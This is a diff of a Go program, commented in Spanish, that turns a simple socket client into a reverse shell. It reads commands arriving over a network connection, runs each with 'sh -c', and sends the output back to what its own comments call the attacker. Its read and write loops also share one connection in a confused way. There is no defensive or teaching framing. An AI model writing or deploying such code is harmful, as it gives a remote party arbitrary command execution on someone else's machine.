@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bufio"
 	"fmt"
 	"io"
 	"net"
@@ -14,40 +15,56 @@ func main() {
     if err != nil {
         panic(err)
     }
+    defer c.Close()
 
-    // Copiar la entrada estándar del cliente al proceso remoto
+    // Canal para capturar la entrada estándar y enviar comandos
     go func() {
-        _, err := io.Copy(c, os.Stdin)
-        if err != nil {
-            fmt.Println(err)
+        reader := bufio.NewReader(os.Stdin)
+        for {
+            fmt.Print("Comando a enviar: ")
+            command, _ := reader.ReadString('\n')
+            // Enviar el comando al atacante
+            c.Write([]byte(command))
         }
     }()
 
-    // Copiar la salida estándar del proceso remoto al cliente
+    // Canal para recibir y mostrar la respuesta del atacante
     go func() {
-        _, err := io.Copy(os.Stdout, c)
-        if err != nil {
-            fmt.Println(err)
+        responseReader := bufio.NewReader(c)
+        for {
+            response, err := responseReader.ReadString('\n')
+            if err == io.EOF {
+                break
+            }
+            if err != nil {
+                fmt.Println("Error al leer la respuesta:", err)
+                return
+            }
+            fmt.Print("Respuesta recibida: ", response)
         }
     }()
 
-    // Copiar la salida de error del proceso remoto al cliente
-    go func() {
-        _, err := io.Copy(os.Stderr, c)
-        if err != nil {
-            fmt.Println(err)
-        }
-    }()
-
-
-    // Mantener la conexión abierta
+    // Mantener la conexión abierta y ejecutar comandos
     for {
-		cmd := exec.Command("ls", "-la")
-        output, err := cmd.Output()
+        // Leer el comando recibido desde el atacante
+        buffer := make([]byte, 1024)
+        n, err := c.Read(buffer)
         if err != nil {
-            fmt.Println(err)
+            fmt.Println("Error al leer el comando:", err)
+            break
         }
-        fmt.Println(string(output))
-		
+
+        receivedCommand := string(buffer[:n])
+        fmt.Println("Comando recibido:", receivedCommand)
+
+        // Ejecutar el comando recibido
+        cmd := exec.Command("sh", "-c", receivedCommand)
+        output, err := cmd.CombinedOutput()
+        if err != nil {
+            fmt.Println("Error al ejecutar el comando:", err)
+        }
+
+        // Enviar la salida de vuelta al atacante
+        c.Write(output)
     }
 }
